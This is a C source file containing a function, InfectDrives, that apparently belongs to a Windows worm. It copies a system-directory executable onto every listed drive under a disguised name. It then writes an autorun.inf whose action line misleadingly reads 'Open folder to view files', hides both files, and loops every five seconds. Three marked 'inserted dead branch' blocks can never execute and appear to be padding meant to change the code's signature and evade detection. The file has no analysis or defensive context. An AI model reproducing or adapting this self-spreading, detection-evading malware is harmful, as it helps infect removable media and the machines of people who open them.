#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>   // for malloc/free
#include <string.h>

#pragma optimize("", off)
void InfectDrives(void)
{
    char IFile[256], NewFile[256], Autorun[256], InfFile[256];
    int i;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            // read existing local (no modification)
            volatile size_t file_len = IFile ? strlen(IFile) : 0;
            hash += (DWORD)file_len;
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    GetSystemDirectoryA(IFile, sizeof(IFile));
    strcat(IFile, "\\updater.exe");

    while (1) {
        // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
        if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
            char *tmp = (char *)malloc(64);
            if (tmp != NULL) {
                strcpy(tmp, "dummy");
                volatile DWORD len = strlen(tmp);
                volatile BYTE check = 0;
                for (volatile DWORD k = 0; k < len; k++) {
                    check ^= tmp[k];
                }
                volatile DWORD j = 0;
                while (j < 2) {
                    // read existing locals (no modification)
                    check += j + (DWORD)IFile[0];
                    j++;
                }
                char tmp2[32];
                memcpy(tmp2, tmp, 4);
                volatile DWORD val = (DWORD)tmp2[0] + check;
                val += len;
                free(tmp);
            }
        }

        for (i = 0; Inf_Drives[i]; i++) {
            memset(NewFile, 0, sizeof(NewFile));
            memset(Autorun, 0, sizeof(Autorun));
            memset(InfFile, 0, sizeof(InfFile));

            strcpy(NewFile, Inf_Drives[i]);
            strcpy(Autorun, Inf_Drives[i]);

            strcat(NewFile, "\\autoprompt.exe");
            strcat(Autorun, "\\autorun.inf");

            if (CopyFileA(IFile, NewFile, FALSE)) {
                FILE *runfile = fopen(Autorun, "wb");
                if (runfile) {
                    sprintf(InfFile,
                            "[autorun]\r\nopen=autoprompt.exe\r\naction=Open folder to view files\r\n");
                    fputs(InfFile, runfile);
                    fclose(runfile);
                }
                SetFileAttributesA(NewFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
                SetFileAttributesA(Autorun, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
            }
        }
        Sleep(5000);
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_3 = GetTickCount();
    if ((dummy_tick_3 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_3 & 0x80000000) != 0) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD k = 0; k < 4; k++) {
            dummy_array[k] = k * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD k = 0; k < 4; k++) {
            hash ^= dummy_array[k];
            hash = (hash << 5) - hash;
        }
        volatile DWORD extra_val = 0;
        for (volatile DWORD k = 0; k < 2; k++) {
            extra_val += (hash >> k) & 0xFF;
        }
        extra_val ^= dummy_array[3];
        // read existing locals (no modification)
        extra_val += (DWORD)i;
        memset(dummy_array, 0, sizeof(dummy_array));
    }
}
#pragma optimize("", on)
